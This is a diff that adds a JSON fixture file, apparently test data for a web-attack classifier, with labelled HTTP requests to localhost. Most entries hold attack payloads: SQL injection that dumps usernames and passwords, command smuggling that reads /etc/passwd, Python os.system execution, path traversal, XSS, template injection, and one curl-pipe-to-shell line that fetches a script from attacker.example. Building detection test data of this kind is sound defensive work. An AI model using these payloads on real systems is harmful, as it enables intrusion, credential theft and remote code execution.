@@ -1,0 +1,57 @@
+[
+  {
+    "id": "fixture-sqli-001",
+    "final_label": "SQL Injection",
+    "combined_payload": "GET /login?id=1%20OR%201=1-- HTTP/1.1\nHost: localhost"
+  },
+  {
+    "id": "fixture-sqli-002",
+    "final_label": "SQL Injection",
+    "combined_payload": "POST /search HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\n\nq=' UNION SELECT username,password FROM users --"
+  },
+  {
+    "id": "fixture-sqli-003",
+    "final_label": "SQL Injection",
+    "combined_payload": "GET /products?category=1%27%20AND%20SLEEP(5)%20AND%20%271%27=%271 HTTP/1.1\nHost: localhost"
+  },
+  {
+    "id": "fixture-code-001",
+    "final_label": "Code Injection",
+    "combined_payload": "GET /download?file=report.pdf;cat%20/etc/passwd HTTP/1.1\nHost: localhost"
+  },
+  {
+    "id": "fixture-code-002",
+    "final_label": "Code Injection",
+    "combined_payload": "POST /api/run HTTP/1.1\nHost: localhost\nContent-Type: application/json\n\n{\"script\":\"__import__('os').system('whoami')\"}"
+  },
+  {
+    "id": "fixture-code-003",
+    "final_label": "Code Injection",
+    "combined_payload": "GET /status?cmd=$(curl%20http://attacker.example/payload.sh|sh) HTTP/1.1\nHost: localhost"
+  },
+  {
+    "id": "fixture-other-001",
+    "final_label": "Other Attacks",
+    "combined_payload": "GET /profile?bio=<script>alert(1)</script> HTTP/1.1\nHost: localhost"
+  },
+  {
+    "id": "fixture-other-002",
+    "final_label": "Other Attacks",
+    "combined_payload": "GET /assets?path=../../../../windows/system32/drivers/etc/hosts HTTP/1.1\nHost: localhost"
+  },
+  {
+    "id": "fixture-other-003",
+    "final_label": "Other Attacks",
+    "combined_payload": "POST /render HTTP/1.1\nHost: localhost\nContent-Type: application/json\n\n{\"template\":\"{{7*7}}\"}"
+  },
+  {
+    "id": "fixture-normal-001",
+    "final_label": "Normal",
+    "combined_payload": "GET /products?page=2&sort=popular HTTP/1.1\nHost: localhost"
+  },
+  {
+    "id": "fixture-normal-002",
+    "final_label": "Normal",
+    "combined_payload": "POST /login HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\n\nusername=alice&password=correcthorsebatterystaple"
+  }
+]
